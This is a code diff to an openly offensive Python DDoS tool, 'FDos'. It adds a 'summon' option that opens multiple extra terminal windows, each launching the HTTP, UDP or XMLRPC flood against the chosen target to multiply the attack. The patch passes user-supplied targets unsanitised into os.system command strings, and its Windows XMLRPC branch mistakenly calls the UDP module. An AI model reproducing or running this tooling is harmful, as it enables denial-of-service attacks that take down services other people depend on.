@@ -4,6 +4,8 @@
 # If free, just use it okey?
 #############################################################
 import argparse
+import os
+import subprocess
 from ddos.httpsgp import Http
 from ddos.udp import Udp
 from ddos.xmlrpc import Xmlrpc
@@ -24,15 +26,23 @@ banner = """
 def error_msg(msg):
     print(f"[ERROR] {msg}")
 
-
 def uparse(url):
     return urlparse(url).netloc
+
+# check xterm for summon method.
+def check_xterm():
+    try:
+        subprocess.run(['which', 'xterm'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
 
 def main():
     parser = argparse.ArgumentParser(description="FDos - All Ddos in one tools.")
     parser.add_argument('-t', '--target', help='Set target (IP/Domain)', metavar='target')
     parser.add_argument('-d', '--ddos', help='DDOS Type (use -ld/--list_ddos)', metavar='ddos_type')
-    parser.add_argument('-s', '--sleep', help='Delay when down/something error.', type=int, default=0.1, metavar='time')
+    parser.add_argument('-s', '--sleep', help='Delay when down/something error.', type=float, default=0.1, metavar='time')
+    parser.add_argument('-sm', '--summon', help="Summon another terminal proccess for ddos", metavar='number', type=int, default=0)
     parser.add_argument('-th', '--thread', help='Thread for attack. Default = 10', type=int, default=10, metavar='number_thread')
     parser.add_argument('-v', '--version', help='Show Version Tools', required=False, action='store_true')
     parser.add_argument('-ld', '--list_ddos', help='Show DDOS Type', action='store_true')
@@ -75,18 +85,57 @@ For using : -d (ddos_type) example : -d HTTP/SG or -d XMLRPC"""
         if args.ddos is None:
             error_msg('DDoS type cannot be empty. use -d/--ddos ddos_type\nFor list type ddos use -ld/--list_ddos'); sys.exit(0)
         
+
         # execute
+        #conf = {"ddos": args.ddos.lower(), "target": args.target, ""}
         if args.ddos.upper() == "HTTP/SP" or args.ddos.upper() == "HTTP/SG":
+            if args.summon != 0:
+                if os.name == 'nt':
+                    command = f"python -c \"from ddos.httpsgp import Http; send = Http('{args.ddos.lower()}', '{args.target}', {str(args.sleep)}, {str(args.thread)}, '{tipe}'); send.attack()\""
+                    for i in range(args.summon):
+                        os.system(f"start cmd /K {command}")
+
+                else:
+                    if check_xterm():
+                        xterm = f"python3 -c 'from ddos.httpsgp import Http; send = Http(\"{args.ddos.lower()}\", \"{args.target}\", {str(args.sleep)}, {str(args.thread)}, \"{tipe}\"); send.attack()'&"
+                        for i in range(args.summon):
+                            os.system(f"xterm -hold -e {xterm}")
+                    else:
+                        error_msg("Xterm is not installed. Automatic disable this feature.")
             send = Http(args.ddos, args.target, args.sleep, args.thread, tipe)
             send.attack()
-
+            
         if args.ddos.upper() == "UDP":
+            if args.summon != 0:
+                if os.name == 'nt':
+                    command = f"python -c \"from ddos.udp import Udp; send = Udp('{args.target}', {str(args.thread)}, {str(args.sleep)}); send.attack()\""
+                    for i in range(args.summon):
+                        os.system(f"start cmd /K {command}")
+                else:
+                    if check_xterm():
+                        xterm = f"python3 -c 'from ddos.udp import Udp; send = Udp(\"{args.target}\", {str(args.thread)}, {str(args.sleep)}); send.attack()'&"
+                        for i in range(args.summon):
+                            os.system(f"xterm -hold -e {xterm}")
+                    else:
+                        error_msg("Xterm is not installed. Automatic disable this feature.")
             send = Udp(args.target, args.thread, args.sleep)
             send.attack()
 
         if args.ddos.upper() == "XMLRPC":
             if '/xmlrpc.php' not in args.target:
                 error_msg("Please include path xmlrpc.php"); sys.exit(0)
+            if args.summon != 0:
+                if os.name == 'nt':
+                    command = f"python -c \"from ddos.udp import Udp; send = Udp('{args.target}', {str(args.thread)}, {str(args.sleep)}); send.attack()\""
+                    for i in range(args.summon):
+                        os.system(f"start cmd /K {command}")
+                else:
+                    if check_xterm():
+                        xterm = f"python3 -c 'from ddos.xmlrpc import Xmlrpc; send = Xmlrpc(\"{args.target}\", {str(args.thread)}, {str(args.sleep)}); send.attack()'&"
+                        for i in range(args.summon):
+                            os.system(f"xterm -hold -e {xterm}")
+                    else:
+                        error_msg("Xterm is not installed. Automatic disable this feature.")
             send = Xmlrpc(args.target, args.thread, args.sleep)
             send.attack()
         
